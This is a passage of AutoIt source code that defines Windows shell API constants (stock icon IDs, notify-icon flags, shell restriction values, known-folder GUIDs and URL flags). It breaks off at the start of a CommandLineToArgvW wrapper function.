Global Const $SIID_LOCK = 0x2f
Global Const $SIID_AUTOLIST = 0x31
Global Const $SIID_PRINTERNET = 0x32
Global Const $SIID_SERVERSHARE = 0x33
Global Const $SIID_PRINTERFAX = 0x34
Global Const $SIID_PRINTERFAXNET = 0x35
Global Const $SIID_PRINTERFILE = 0x36
Global Const $SIID_STACK = 0x37
Global Const $SIID_MEDIASVCD = 0x38
Global Const $SIID_STUFFEDFOLDER = 0x39
Global Const $SIID_DRIVEUNKNOWN = 0x3a
Global Const $SIID_DRIVEDVD = 0x3b
Global Const $SIID_MEDIADVD = 0x3c
Global Const $SIID_MEDIADVDRAM = 0x3d
Global Const $SIID_MEDIADVDRW = 0x3e
Global Const $SIID_MEDIADVDR = 0x3f
Global Const $SIID_MEDIADVDROM = 0x40
Global Const $SIID_MEDIACDAUDIOPLUS = 0x41
Global Const $SIID_MEDIACDRW = 0x42
Global Const $SIID_MEDIACDR = 0x43
Global Const $SIID_MEDIACDBURN = 0x44
Global Const $SIID_MEDIABLANKCD = 0x45
Global Const $SIID_MEDIACDROM = 0x46
Global Const $SIID_AUDIOFILES = 0x47
Global Const $SIID_IMAGEFILES = 0x48
Global Const $SIID_VIDEOFILES = 0x49
Global Const $SIID_MIXEDFILES = 0x4a
Global Const $SIID_FOLDERBACK = 0x4b
Global Const $SIID_FOLDERFRONT = 0x4c
Global Const $SIID_SHIELD = 0x4d
Global Const $SIID_WARNING = 0x4e
Global Const $SIID_INFO = 0x4f
Global Const $SIID_ERROR = 0x50
Global Const $SIID_KEY = 0x51
Global Const $SIID_SOFTWARE = 0x52
Global Const $SIID_RENAME = 0x53
Global Const $SIID_DELETE = 0x54
Global Const $SIID_MEDIAAUDIODVD = 0x55
Global Const $SIID_MEDIAMOVIEDVD = 0x56
Global Const $SIID_MEDIAENHANCEDCD = 0x57
Global Const $SIID_MEDIAENHANCEDDVD = 0x58
Global Const $SIID_MEDIAHDDVD = 0x59
Global Const $SIID_MEDIABLURAY = 0x5a
Global Const $SIID_MEDIAVCD = 0x5b
Global Const $SIID_MEDIADVDPLUSR = 0x5c
Global Const $SIID_MEDIADVDPLUSRW = 0x5d
Global Const $SIID_DESKTOPPC = 0x5e
Global Const $SIID_MOBILEPC = 0x5f
Global Const $SIID_USERS = 0x60
Global Const $SIID_MEDIASMARTMEDIA = 0x61
Global Const $SIID_MEDIACOMPACTFLASH = 0x62
Global Const $SIID_DEVICECELLPHONE = 0x63
Global Const $SIID_DEVICECAMERA = 0x64
Global Const $SIID_DEVICEVIDEOCAMERA = 0x65
Global Const $SIID_DEVICEAUDIOPLAYER = 0x66
Global Const $SIID_NETWORKCONNECT = 0x67
Global Const $SIID_INTERNET = 0x68
Global Const $SIID_ZIPFILE = 0x69
Global Const $SIID_SETTINGS = 0x6a
Global Const $SIID_DRIVEHDDVD = 0x84
Global Const $SIID_DRIVEBD = 0x85
Global Const $SIID_MEDIAHDDVDROM = 0x86
Global Const $SIID_MEDIAHDDVDR = 0x87
Global Const $SIID_MEDIAHDDVDRAM = 0x88
Global Const $SIID_MEDIABDROM = 0x89
Global Const $SIID_MEDIABDR = 0x8a
Global Const $SIID_MEDIABDRE = 0x8b
Global Const $SIID_CLUSTEREDDRIVE = 0x8c
Global Const $SIID_MAX_ICONS = 0xae
Global Const $SHGSI_ICONLOCATION = 0x0
Global Const $SHGSI_ICON = $SHGFI_ICON
Global Const $SHGSI_SYSICONINDEX = $SHGFI_SYSICONINDEX
Global Const $SHGSI_LINKOVERLAY = $SHGFI_LINKOVERLAY
Global Const $SHGSI_SELECTED = $SHGFI_SELECTED
Global Const $SHGSI_LARGEICON = $SHGFI_LARGEICON
Global Const $SHGSI_SMALLICON = $SHGFI_SMALLICON
Global Const $SHGSI_SHELLICONSIZE = $SHGFI_SHELLICONSIZE
Global Const $NIM_ADD = 0x0
Global Const $NIM_MODIFY = 0x1
Global Const $NIM_DELETE = 0x2
Global Const $NIM_SETFOCUS = 0x3
Global Const $NIM_SETVERSION = 0x4
Global Const $NIF_MESSAGE = 0x1
Global Const $NIF_ICON = 0x2
Global Const $NIF_TIP = 0x4
Global Const $NIF_STATE = 0x8
Global Const $NIF_INFO = 0x10
Global Const $NIF_GUID = 0x20
Global Const $NIF_REALTIME = 0x40
Global Const $NIF_SHOWTIP = 0x80
Global Const $NIS_HIDDEN = 0x1
Global Const $NIS_SHAREDICON = 0x2
Global Const $NIIF_NONE = 0x0
Global Const $NIIF_INFO = 0x1
Global Const $NIIF_WARNING = 0x2
Global Const $NIIF_ERROR = 0x3
Global Const $NIIF_USER = 0x4
Global Const $NIIF_NOSOUND = 0x10
Global Const $NIIF_LARGE_ICON = 0x10
Global Const $NIIF_RESPECT_QUIET_TIME = 0x80
Global Const $NIIF_ICON_MASK = 0xf
Global Const $SHOP_PRINTERNAME = 0x1
Global Const $SHOP_FILEPATH = 0x2
Global Const $SHOP_VOLUMEGUID = 0x4
Global Const $OFASI_EDIT = 0x1
Global Const $OFASI_OPENDESKTOP = 0x2
Global Const $QUNS_NOT_PRESENT = 0x1
Global Const $QUNS_BUSY = 0x2
Global Const $QUNS_RUNNING_D3D_FULL_SCREEN = 0x3
Global Const $QUNS_PRESENTATION_MODE = 0x4
Global Const $QUNS_ACCEPTS_NOTIFICATIONS = 0x5
Global Const $QUNS_QUIET_TIME = 0x6
Global Const $REST_NORUN = 0x1
Global Const $REST_NOCLOSE = 0x2
Global Const $REST_NOSAVESET = 0x3
Global Const $REST_NOFILEMENU = 0x4
Global Const $REST_NOSETFOLDERS = 0x5
Global Const $REST_NOSETTASKBAR = 0x6
Global Const $REST_NODESKTOP = 0x7
Global Const $REST_NOFIND = 0x8
Global Const $REST_NODRIVES = 0x9
Global Const $REST_NODRIVEAUTORUN = 0xa
Global Const $REST_NODRIVETYPEAUTORUN = 0xb
Global Const $REST_NONETHOOD = 0xc
Global Const $REST_STARTBANNER = 0xd
Global Const $REST_RESTRICTRUN = 0xe
Global Const $REST_NOPRINTERTABS = 0xf
Global Const $REST_NOPRINTERDELETE = 0x10
Global Const $REST_NOPRINTERADD = 0x11
Global Const $REST_NOSTARTMENUSUBFOLDERS = 0x12
Global Const $REST_MYDOCSONNET = 0x13
Global Const $REST_NOEXITTODOS = 0x14
Global Const $REST_ENFORCESHELLEXTSECURITY = 0x15
Global Const $REST_LINKRESOLVEIGNORELINKINFO = 0x16
Global Const $REST_NOCOMMONGROUPS = 0x17
Global Const $REST_SEPARATEDESKTOPPROCESS = 0x18
Global Const $REST_NOWEB = 0x19
Global Const $REST_NOTRAYCONTEXTMENU = 0x1a
Global Const $REST_NOVIEWCONTEXTMENU = 0x1b
Global Const $REST_NONETCONNECTDISCONNECT = 0x1c
Global Const $REST_STARTMENULOGOFF = 0x1d
Global Const $REST_NOSETTINGSASSIST = 0x1e
Global Const $REST_NOINTERNETICON = 0x1f
Global Const $REST_NORECENTDOCSHISTORY = 0x20
Global Const $REST_NORECENTDOCSMENU = 0x21
Global Const $REST_NOACTIVEDESKTOP = 0x22
Global Const $REST_NOACTIVEDESKTOPCHANGES = 0x23
Global Const $REST_NOFAVORITESMENU = 0x24
Global Const $REST_CLEARRECENTDOCSONEXIT = 0x25
Global Const $REST_CLASSICSHELL = 0x26
Global Const $REST_NOCUSTOMIZEWEBVIEW = 0x27
Global Const $REST_NOHTMLWALLPAPER = 0x28
Global Const $REST_NOCHANGINGWALLPAPER = 0x29
Global Const $REST_NODESKCOMP = 0x2a
Global Const $REST_NOADDDESKCOMP = 0x2b
Global Const $REST_NODELDESKCOMP = 0x2c
Global Const $REST_NOCLOSEDESKCOMP = 0x2d
Global Const $REST_NOCLOSE_DRAGDROPBAND = 0x2e
Global Const $REST_NOMOVINGBAND = 0x2f
Global Const $REST_NOEDITDESKCOMP = 0x30
Global Const $REST_NORESOLVESEARCH = 0x31
Global Const $REST_NORESOLVETRACK = 0x32
Global Const $REST_FORCECOPYACLWITHFILE = 0x33
Global Const $REST_NOLOGO3CHANNELNOTIFY = 0x34
Global Const $REST_NOFORGETSOFTWAREUPDATE = 0x35
Global Const $REST_NOSETACTIVEDESKTOP = 0x36
Global Const $REST_NOUPDATEWINDOWS = 0x37
Global Const $REST_NOCHANGESTARMENU = 0x38
Global Const $REST_NOFOLDEROPTIONS = 0x39
Global Const $REST_HASFINDCOMPUTERS = 0x3a
Global Const $REST_INTELLIMENUS = 0x3b
Global Const $REST_RUNDLGMEMCHECKBOX = 0x3c
Global Const $REST_ARP_SHOWPOSTSETUP = 0x3d
Global Const $REST_NOCSC = 0x3e
Global Const $REST_NOCONTROLPANEL = 0x3f
Global Const $REST_ENUMWORKGROUP = 0x40
Global Const $REST_ARP_NOARP = 0x41
Global Const $REST_ARP_NOREMOVEPAGE = 0x42
Global Const $REST_ARP_NOADDPAGE = 0x43
Global Const $REST_ARP_NOWINSETUPPAGE = 0x44
Global Const $REST_GREYMSIADS = 0x45
Global Const $REST_NOCHANGEMAPPEDDRIVELABEL = 0x46
Global Const $REST_NOCHANGEMAPPEDDRIVECOMMENT = 0x47
Global Const $REST_MAXRECENTDOCS = 0x48
Global Const $REST_NONETWORKCONNECTIONS = 0x49
Global Const $REST_FORCESTARTMENULOGOFF = 0x4a
Global Const $REST_NOWEBVIEW = 0x4b
Global Const $REST_NOCUSTOMIZETHISFOLDER = 0x4c
Global Const $REST_NOENCRYPTION = 0x4d
Global Const $REST_DONTSHOWSUPERHIDDEN = 0x4e
Global Const $REST_NOSHELLSEARCHBUTTON = 0x4f
Global Const $REST_NOHARDWARETAB = 0x50
Global Const $REST_NORUNASINSTALLPROMPT = 0x51
Global Const $REST_PROMPTRUNASINSTALLNETPATH = 0x52
Global Const $REST_NOMANAGEMYCOMPUTERVERB = 0x53
Global Const $REST_NORECENTDOCSNETHOOD = 0x54
Global Const $REST_DISALLOWRUN = 0x55
Global Const $REST_NOWELCOMESCREEN = 0x56
Global Const $REST_RESTRICTCPL = 0x57
Global Const $REST_DISALLOWCPL = 0x58
Global Const $REST_NOSMBALLOONTIP = 0x59
Global Const $REST_NOSMHELP = 0x5a
Global Const $REST_NOWINKEYS = 0x5b
Global Const $REST_NOENCRYPTONMOVE = 0x5c
Global Const $REST_NOLOCALMACHINERUN = 0x5d
Global Const $REST_NOCURRENTUSERRUN = 0x5e
Global Const $REST_NOLOCALMACHINERUNONCE = 0x5f
Global Const $REST_NOCURRENTUSERRUNONCE = 0x60
Global Const $REST_FORCEACTIVEDESKTOPON = 0x61
Global Const $REST_NOCOMPUTERSNEARME = 0x62
Global Const $REST_NOVIEWONDRIVE = 0x63
Global Const $REST_NONETCRAWL = 0x64
Global Const $REST_NOSHAREDDOCUMENTS = 0x65
Global Const $REST_NOSMMYDOCS = 0x66
Global Const $REST_NOSMMYPICS = 0x67
Global Const $REST_ALLOWBITBUCKDRIVES = 0x68
Global Const $REST_NONLEGACYSHELLMODE = 0x69
Global Const $REST_NOCONTROLPANELBARRICADE = 0x6a
Global Const $REST_NOSTARTPAGE = 0x6b
Global Const $REST_NOAUTOTRAYNOTIFY = 0x6c
Global Const $REST_NOTASKGROUPING = 0x6d
Global Const $REST_NOCDBURNING = 0x6e
Global Const $REST_MYCOMPNOPROP = 0x6f
Global Const $REST_MYDOCSNOPROP = 0x70
Global Const $REST_NOSTARTPANEL = 0x71
Global Const $REST_NODISPLAYAPPEARANCEPAGE = 0x72
Global Const $REST_NOTHEMESTAB = 0x73
Global Const $REST_NOVISUALSTYLECHOICE = 0x74
Global Const $REST_NOSIZECHOICE = 0x75
Global Const $REST_NOCOLORCHOICE = 0x76
Global Const $REST_SETVISUALSTYLE = 0x77
Global Const $REST_STARTRUNNOHOMEPATH = 0x78
Global Const $REST_NOUSERNAMEINSTARTPANEL = 0x79
Global Const $REST_NOMYCOMPUTERICON = 0x7a
Global Const $REST_NOSMNETWORKPLACES = 0x7b
Global Const $REST_NOSMPINNEDLIST = 0x7c
Global Const $REST_NOSMMYMUSIC = 0x7d
Global Const $REST_NOSMEJECTPC = 0x7e
Global Const $REST_NOSMMOREPROGRAMS = 0x7f
Global Const $REST_NOSMMFUPROGRAMS = 0x80
Global Const $REST_NOTRAYITEMSDISPLAY = 0x81
Global Const $REST_NOTOOLBARSONTASKBAR = 0x82
Global Const $REST_NOSMCONFIGUREPROGRAMS = 0x83
Global Const $REST_HIDECLOCK = 0x84
Global Const $REST_NOLOWDISKSPACECHECKS = 0x85
Global Const $REST_NOENTIRENETWORK = 0x86
Global Const $REST_NODESKTOPCLEANUP = 0x87
Global Const $REST_BITBUCKNUKEONDELETE = 0x88
Global Const $REST_BITBUCKCONFIRMDELETE = 0x89
Global Const $REST_BITBUCKNOPROP = 0x8a
Global Const $REST_NODISPBACKGROUND = 0x8b
Global Const $REST_NODISPSCREENSAVEPG = 0x8c
Global Const $REST_NODISPSETTINGSPG = 0x8d
Global Const $REST_NODISPSCREENSAVEPREVIEW = 0x8e
Global Const $REST_NODISPLAYCPL = 0x8f
Global Const $REST_HIDERUNASVERB = 0x90
Global Const $REST_NOTHUMBNAILCACHE = 0x91
Global Const $REST_NOSTRCMPLOGICAL = 0x92
Global Const $REST_NOPUBLISHWIZARD = 0x93
Global Const $REST_NOONLINEPRINTSWIZARD = 0x94
Global Const $REST_NOWEBSERVICES = 0x95
Global Const $REST_ALLOWUNHASHEDWEBVIEW = 0x96
Global Const $REST_ALLOWLEGACYWEBVIEW = 0x97
Global Const $REST_REVERTWEBVIEWSECURITY = 0x98
Global Const $REST_INHERITCONSOLEHANDLES = 0x99
Global Const $REST_SORTMAXITEMCOUNT = 0x9a
Global Const $REST_NOREMOTERECURSIVEEVENTS = 0x9b
Global Const $REST_NOREMOTECHANGENOTIFY = 0x9c
Global Const $REST_NOSIMPLENETIDLIST = 0x9d
Global Const $REST_NOENUMENTIRENETWORK = 0x9e
Global Const $REST_NODETAILSTHUMBNAILONNETWORK = 0x9f
Global Const $REST_NOINTERNETOPENWITH = 0xa0
Global Const $REST_ALLOWLEGACYLMZBEHAVIOR = 0xa1
Global Const $REST_DONTRETRYBADNETNAME = 0xa2
Global Const $REST_ALLOWFILECLSIDJUNCTIONS = 0xa3
Global Const $REST_NOUPNPINSTALL = 0xa4
Global Const $REST_ARP_DONTGROUPPATCHES = 0xa5
Global Const $REST_ARP_NOCHOOSEPROGRAMSPAGE = 0xa6
Global Const $REST_NODISCONNECT = 0xa7
Global Const $REST_NOSECURITY = 0xa8
Global Const $REST_NOFILEASSOCIATE = 0xa9
Global Const $REST_ALLOWCOMMENTTOGGLE = 0xaa
Global Const $REST_USEDESKTOPINICACHE = 0xab
Global Const $GIL_DONTCACHE = 0x10
Global Const $GIL_NOTFILENAME = 0x8
Global Const $GIL_PERCLASS = 0x4
Global Const $GIL_PERINSTANCE = 0x2
Global Const $GIL_SIMULATEDOC = 0x1
Global Const $GIL_SHIELD = 0x200
Global Const $GIL_FORCENOSHIELD = 0x400
Global Const $FOLDERID_ADDNEWPROGRAMS = "{DE61D971-5EBC-4F02-A3A9-6C82895E5C04}"
Global Const $FOLDERID_ADMINTOOLS = "{724EF170-A42D-4FEF-9F26-B60E846FBA4F}"
Global Const $FOLDERID_APPUPDATES = "{A305CE99-F527-492B-8B1A-7E76FA98D6E4}"
Global Const $FOLDERID_CDBURNING = "{9E52AB10-F80D-49DF-ACB8-4330F5687855}"
Global Const $FOLDERID_CHANGEREMOVEPROGRAMS = "{DF7266AC-9274-4867-8D55-3BD661DE872D}"
Global Const $FOLDERID_COMMONADMINTOOLS = "{D0384E7D-BAC3-4797-8F14-CBA229B392B5}"
Global Const $FOLDERID_COMMONOEMLINKS = "{C1BAE2D0-10DF-4334-BEDD-7AA20B227A9D}"
Global Const $FOLDERID_COMMONPROGRAMS = "{0139D44E-6AFE-49F2-8690-3DAFCAE6FFB8}"
Global Const $FOLDERID_COMMONSTARTMENU = "{A4115719-D62E-491D-AA7C-E74B8BE3B067}"
Global Const $FOLDERID_COMMONSTARTUP = "{82A5EA35-D9CD-47C5-9629-E15D2F714E6E}"
Global Const $FOLDERID_COMMONTEMPLATES = "{B94237E7-57AC-4347-9151-B08C6C32D1F7}"
Global Const $FOLDERID_COMPUTERFOLDER = "{0AC0837C-BBF8-452A-850D-79D08E667CA7}"
Global Const $FOLDERID_CONFLICTFOLDER = "{4BFEFB45-347D-4006-A5BE-AC0CB0567192}"
Global Const $FOLDERID_CONNECTIONSFOLDER = "{6F0CD92B-2E97-45D1-88FF-B0D186B8DEDD}"
Global Const $FOLDERID_CONTACTS = "{56784854-C6CB-462B-8169-88E350ACB882}"
Global Const $FOLDERID_CONTROLPANELFOLDER = "{82A74AEB-AEB4-465C-A014-D097EE346D63}"
Global Const $FOLDERID_COOKIES = "{2B0F765D-C0E9-4171-908E-08A611B84FF6}"
Global Const $FOLDERID_DESKTOP = "{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}"
Global Const $FOLDERID_DEVICEMETADATASTORE = "{5CE4A5E9-E4EB-479D-B89F-130C02886155}"
Global Const $FOLDERID_DOCUMENTSLIBRARY = "{7B0DB17D-9CD2-4A93-9733-46CC89022E7C}"
Global Const $FOLDERID_DOWNLOADS = "{374DE290-123F-4565-9164-39C4925E467B}"
Global Const $FOLDERID_FAVORITES = "{1777F761-68AD-4D8A-87BD-30B759FA33DD}"
Global Const $FOLDERID_FONTS = "{FD228CB7-AE11-4AE3-864C-16F3910AB8FE}"
Global Const $FOLDERID_GAMES = "{CAC52C1A-B53D-4EDC-92D7-6B2E8AC19434}"
Global Const $FOLDERID_GAMETASKS = "{054FAE61-4DD8-4787-80B6-090220C4B700}"
Global Const $FOLDERID_HISTORY = "{D9DC8A3B-B784-432E-A781-5A1130A75963}"
Global Const $FOLDERID_HOMEGROUP = "{52528A6B-B9E3-4ADD-B60D-588C2DBA842D}"
Global Const $FOLDERID_IMPLICITAPPSHORTCUTS = "{BCB5256F-79F6-4CEE-B725-DC34E402FD46}"
Global Const $FOLDERID_INTERNETCACHE = "{352481E8-33BE-4251-BA85-6007CAEDCF9D}"
Global Const $FOLDERID_INTERNETFOLDER = "{4D9F7874-4E0C-4904-967B-40B0D20C3E4B}"
Global Const $FOLDERID_LIBRARIES = "{1B3EA5DC-B587-4786-B4EF-BD1DC332AEAE}"
Global Const $FOLDERID_LINKS = "{BFB9D5E0-C6A9-404C-B2B2-AE6DB6AF4968}"
Global Const $FOLDERID_LOCALAPPDATA = "{F1B32785-6FBA-4FCF-9D55-7B8E7F157091}"
Global Const $FOLDERID_LOCALAPPDATALOW = "{A520A1A4-1780-4FF6-BD18-167343C5AF16}"
Global Const $FOLDERID_LOCALIZEDRESOURCESDIR = "{2A00375E-224C-49DE-B8D1-440DF7EF3DDC}"
Global Const $FOLDERID_MUSIC = "{4BD8D571-6D19-48D3-BE97-422220080E43}"
Global Const $FOLDERID_MUSICLIBRARY = "{2112AB0A-C86A-4FFE-A368-0DE96E47012E}"
Global Const $FOLDERID_NETHOOD = "{C5ABBF53-E17F-4121-8900-86626FC2C973}"
Global Const $FOLDERID_NETWORKFOLDER = "{D20BEEC4-5CA8-4905-AE3B-BF251EA09B53}"
Global Const $FOLDERID_ORIGINALIMAGES = "{2C36C0AA-5812-4B87-BFD0-4CD0DFB19B39}"
Global Const $FOLDERID_PHOTOALBUMS = "{69D2CF90-FC33-4FB7-9A0C-EBB0F0FCB43C}"
Global Const $FOLDERID_PICTURESLIBRARY = "{A990AE9F-A03B-4E80-94BC-9912D7504104}"
Global Const $FOLDERID_PICTURES = "{33E28130-4E1E-4676-835A-98395C3BC3BB}"
Global Const $FOLDERID_PLAYLISTS = "{DE92C1C7-837F-4F69-A3BB-86E631204A23}"
Global Const $FOLDERID_PRINTERSFOLDER = "{76FC4E2D-D6AD-4519-A663-37BD56068185}"
Global Const $FOLDERID_PRINTHOOD = "{9274BD8D-CFD1-41C3-B35E-B13F55A758F4}"
Global Const $FOLDERID_PROFILE = "{5E6C858F-0E22-4760-9AFE-EA3317B67173}"
Global Const $FOLDERID_PROGRAMDATA = "{62AB5D82-FDC1-4DC3-A9DD-070D1D495D97}"
Global Const $FOLDERID_PROGRAMFILES = "{905E63B6-C1BF-494E-B29C-65B732D3D21A}"
Global Const $FOLDERID_PROGRAMFILESX64 = "{6D809377-6AF0-444B-8957-A3773F02200E}"
Global Const $FOLDERID_PROGRAMFILESX86 = "{7C5A40EF-A0FB-4BFC-874A-C0F2E0B9FA8E}"
Global Const $FOLDERID_PROGRAMFILESCOMMON = "{F7F1ED05-9F6D-47A2-AAAE-29D317C6F066}"
Global Const $FOLDERID_PROGRAMFILESCOMMONX64 = "{6365D5A7-0F0D-45E5-87F6-0DA56B6A4F7D}"
Global Const $FOLDERID_PROGRAMFILESCOMMONX86 = "{DE974D24-D9C6-4D3E-BF91-F4455120B917}"
Global Const $FOLDERID_PROGRAMS = "{A77F5D77-2E2B-44C3-A6A2-ABA601054A51}"
Global Const $FOLDERID_PUBLIC = "{DFDF76A2-C82A-4D63-906A-5644AC457385}"
Global Const $FOLDERID_PUBLICDESKTOP = "{C4AA340D-F20F-4863-AFEF-F87EF2E6BA25}"
Global Const $FOLDERID_PUBLICDOCUMENTS = "{ED4824AF-DCE4-45A8-81E2-FC7965083634}"
Global Const $FOLDERID_PUBLICDOWNLOADS = "{3D644C9B-1FB8-4F30-9B45-F670235F79C0}"
Global Const $FOLDERID_PUBLICGAMETASKS = "{DEBF2536-E1A8-4C59-B6A2-414586476AEA}"
Global Const $FOLDERID_PUBLICLIBRARIES = "{48DAF80B-E6CF-4F4E-B800-0E69D84EE384}"
Global Const $FOLDERID_PUBLICMUSIC = "{3214FAB5-9757-4298-BB61-92A9DEAA44FF}"
Global Const $FOLDERID_PUBLICPICTURES = "{B6EBFB86-6907-413C-9AF7-4FC2ABF07CC5}"
Global Const $FOLDERID_PUBLICRINGTONES = "{E555AB60-153B-4D17-9F04-A5FE99FC15EC}"
Global Const $FOLDERID_PUBLICVIDEOS = "{2400183A-6185-49FB-A2D8-4A392A602BA3}"
Global Const $FOLDERID_QUICKLAUNCH = "{52A4F021-7B75-48A9-9F6B-4B87A210BC8F}"
Global Const $FOLDERID_RECENT = "{AE50C081-EBD2-438A-8655-8A092E34987A}"
Global Const $FOLDERID_RECORDEDTVLIBRARY = "{1A6FDBA2-F42D-4358-A798-B74D745926C5}"
Global Const $FOLDERID_RECYCLEBINFOLDER = "{B7534046-3ECB-4C18-BE4E-64CD4CB7D6AC}"
Global Const $FOLDERID_RESOURCEDIR = "{8AD10C31-2ADB-4296-A8F7-E4701232C972}"
Global Const $FOLDERID_RINGTONES = "{C870044B-F49E-4126-A9C3-B52A1FF411E8}"
Global Const $FOLDERID_ROAMINGAPPDATA = "{3EB685DB-65F9-4CF6-A03A-E3EF65729F3D}"
Global Const $FOLDERID_SAMPLEMUSIC = "{B250C668-F57D-4EE1-A63C-290EE7D1AA1F}"
Global Const $FOLDERID_SAMPLEPICTURES = "{C4900540-2379-4C75-844B-64E6FAF8716B}"
Global Const $FOLDERID_SAMPLEPLAYLISTS = "{15CA69B3-30EE-49C1-ACE1-6B5EC372AFB5}"
Global Const $FOLDERID_SAMPLEVIDEOS = "{859EAD94-2E85-48AD-A71A-0969CB56A6CD}"
Global Const $FOLDERID_SAVEDGAMES = "{4C5C32FF-BB9D-43B0-B5B4-2D72E54EAAA4}"
Global Const $FOLDERID_SAVEDSEARCHES = "{7D1D3A04-DEBB-4115-95CF-2F29DA2920DA}"
Global Const $FOLDERID_SEARCH_CSC = "{EE32E446-31CA-4ABA-814F-A5EBD2FD6D5E}"
Global Const $FOLDERID_SEARCH_MAPI = "{98EC0E18-2098-4D44-8644-66979315A281}"
Global Const $FOLDERID_SEARCHHOME = "{190337D1-B8CA-4121-A639-6D472D16972A}"
Global Const $FOLDERID_SENDTO = "{8983036C-27C0-404B-8F08-102D10DCFD74}"
Global Const $FOLDERID_SIDEBARDEFAULTPARTS = "{7B396E54-9EC5-4300-BE0A-2482EBAE1A26}"
Global Const $FOLDERID_SIDEBARPARTS = "{A75D362E-50FC-4FB7-AC2C-A8BEAA314493}"
Global Const $FOLDERID_STARTMENU = "{625B53C3-AB48-4EC1-BA1F-A1EF4146FC19}"
Global Const $FOLDERID_STARTUP = "{B97D20BB-F46A-4C97-BA10-5E3608430854}"
Global Const $FOLDERID_SYNCMANAGERFOLDER = "{43668BF8-C14E-49B2-97C9-747784D784B7}"
Global Const $FOLDERID_SYNCRESULTSFOLDER = "{289A9A43-BE44-4057-A41B-587A76D7E7F9}"
Global Const $FOLDERID_SYNCSETUPFOLDER = "{0F214138-B1D3-4A90-BBA9-27CBC0C5389A}"
Global Const $FOLDERID_SYSTEM = "{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}"
Global Const $FOLDERID_SYSTEMX86 = "{D65231B0-B2F1-4857-A4CE-A8E7C6EA7D27}"
Global Const $FOLDERID_TEMPLATES = "{A63293E8-664E-48DB-A079-DF759E0509F7}"
Global Const $FOLDERID_USERPINNED = "{9E3995AB-1F9C-4F13-B827-48B24B6C7174}"
Global Const $FOLDERID_USERPROFILES = "{0762D272-C50A-4BB0-A382-697DCD729B80}"
Global Const $FOLDERID_USERPROGRAMFILES = "{5CD7AEE2-2219-4A67-B85D-6C9CE15660CB}"
Global Const $FOLDERID_USERPROGRAMFILESCOMMON = "{BCBD3057-CA5C-4622-B42D-BC56DB0AE516}"
Global Const $FOLDERID_USERSFILES = "{F3CE0F7C-4901-4ACC-8648-D5D44B04EF8F}"
Global Const $FOLDERID_USERSLIBRARIES = "{A302545D-DEFF-464B-ABE8-61C8648D939B}"
Global Const $FOLDERID_VIDEOS = "{18989B1D-99B5-455B-841C-AB7C74E4DDFC}"
Global Const $FOLDERID_VIDEOSLIBRARY = "{491E922F-5643-4AF4-A7EB-4E7A138D8174}"
Global Const $FOLDERID_WINDOWS = "{F38BF404-1D43-42F2-9305-67DE0B28FC23}"
Global Const $KF_FLAG_ALIAS_ONLY = -2147483648
Global Const $KF_FLAG_CREATE = 0x8000
Global Const $KF_FLAG_DONT_VERIFY = 0x4000
Global Const $KF_FLAG_DONT_UNEXPAND = 0x2000
Global Const $KF_FLAG_NO_ALIAS = 0x1000
Global Const $KF_FLAG_INIT = 0x800
Global Const $KF_FLAG_DEFAULT_PATH = 0x400
Global Const $KF_FLAG_NO_APPCONTAINER_REDIRECTION = 0x10000
Global Const $KF_FLAG_NOT_PARENT_RELATIVE = 0x200
Global Const $KF_FLAG_SIMPLE_IDLIST = 0x100
Global Const $URL_SCHEME_INVALID = + -1
Global Const $URL_SCHEME_UNKNOWN = 0x0
Global Const $URL_SCHEME_FTP = 0x1
Global Const $URL_SCHEME_HTTP = 0x2
Global Const $URL_SCHEME_GOPHER = 0x3
Global Const $URL_SCHEME_MAILTO = 0x4
Global Const $URL_SCHEME_NEWS = 0x5
Global Const $URL_SCHEME_NNTP = 0x6
Global Const $URL_SCHEME_TELNET = 0x7
Global Const $URL_SCHEME_WAIS = 0x8
Global Const $URL_SCHEME_FILE = 0x9
Global Const $URL_SCHEME_MK = 0xa
Global Const $URL_SCHEME_HTTPS = 0xb
Global Const $URL_SCHEME_SHELL = 0xc
Global Const $URL_SCHEME_SNEWS = 0xd
Global Const $URL_SCHEME_LOCAL = 0xe
Global Const $URL_SCHEME_JAVASCRIPT = 0xf
Global Const $URL_SCHEME_VBSCRIPT = 0x10
Global Const $URL_SCHEME_ABOUT = 0x11
Global Const $URL_SCHEME_RES = 0x12
Global Const $URL_SCHEME_MSSHELLROOTED = 0x13
Global Const $URL_SCHEME_MSSHELLIDLIST = 0x14
Global Const $URL_SCHEME_MSHELP = 0x15
Global Const $URL_SCHEME_MSSHELLDEVICE = 0x16
Global Const $URL_SCHEME_WILDCARD = 0x17
Global Const $URL_SCHEME_SEARCH_MS = 0x18
Global Const $URL_SCHEME_SEARCH = 0x19
Global Const $URL_SCHEME_KNOWNFOLDER = 0x1a
Global Const $GCT_INVALID = 0x0
Global Const $GCT_LFNCHAR = 0x1
Global Const $GCT_SEPARATOR = 0x8
Global Const $GCT_SHORTCHAR = 0x2
Global Const $GCT_WILD = 0x4
Global Const $URL_APPLY_DEFAULT = 0x1
Global Const $URL_APPLY_GUESSSCHEME = 0x2
Global Const $URL_APPLY_GUESSFILE = 0x4
Global Const $URL_APPLY_FORCEAPPLY = 0x8
Global Const $URL_DONT_SIMPLIFY = 0x8000000
Global Const $URL_ESCAPE_AS_UTF8 = 0x40000
Global Const $URL_ESCAPE_PERCENT = 0x1000
Global Const $URL_ESCAPE_SPACES_ONLY = 0x4000000
Global Const $URL_ESCAPE_UNSAFE = 0x20000000
Global Const $URL_NO_META = 0x8000000
Global Const $URL_PLUGGABLE_PROTOCOL = 0x40000000
Global Const $URL_UNESCAPE = 0x10000000
Global Const $URL_PART_HOSTNAME = 0x2
Global Const $URL_PART_PASSWORD = 0x4
Global Const $URL_PART_PORT = 0x5
Global Const $URL_PART_QUERY = 0x6
Global Const $URL_PART_SCHEME = 0x1
Global Const $URL_PART_USERNAME = 0x3
Global Const $URLIS_APPLIABLE = 0x4
Global Const $URLIS_DIRECTORY = 0x5
Global Const $URLIS_FILEURL = 0x3
Global Const $URLIS_HASQUERY = 0x6
Global Const $URLIS_NOHISTORY = 0x2
Global Const $URLIS_OPAQUE = 0x1
Global Const $URLIS_URL = 0x0
#Region Functions list
#EndRegion Functions list
#Region Public Functions
    Func _WinAPI_CommandLineToArgv($scmd)
        Local $aret[0x1] = [0x0]
        $scmd = StringStripWS($scmd, $STR_STRIPLEADING + $STR_STRIPTRAILING)
        If Not $scmd Then
            Return $aret
        EndIf
        Local $acall = DllCall("shell32.dll", "ptr", "CommandLineToArgvW", "wstr", $scmd, "int*", 0x0)
